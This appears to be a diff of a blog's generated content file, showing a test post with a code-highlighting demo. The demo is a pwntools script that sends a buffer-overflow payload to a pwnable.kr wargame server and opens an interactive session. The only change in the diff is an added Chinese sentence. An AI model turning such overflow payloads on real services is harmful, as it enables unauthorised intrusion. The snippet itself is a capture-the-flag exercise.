@@ -24,7 +24,7 @@
     <content><![CDATA[<h1 id="这是一篇测试文章"><a href="#这是一篇测试文章" class="headerlink" title="这是一篇测试文章"></a>这是一篇测试文章</h1><p>下面是一个代码块</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">nc = remote(<span class="string">"pwnable.kr"</span>, <span class="string">"9000"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x34</span> + p64(<span class="number">0xcafebabe</span>)</span><br><span class="line">nc.send(payload)</span><br><span class="line">nc.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>这是一个代码条<code>printf(&quot;hello world&quot;);</code></p>
+<p>这是一个代码条<code>printf(&quot;hello world&quot;);</code><br>祝这世界继续热闹，祝我仍然是我。</p>
 ]]></content>
       <categories>
         <category>测试</category>
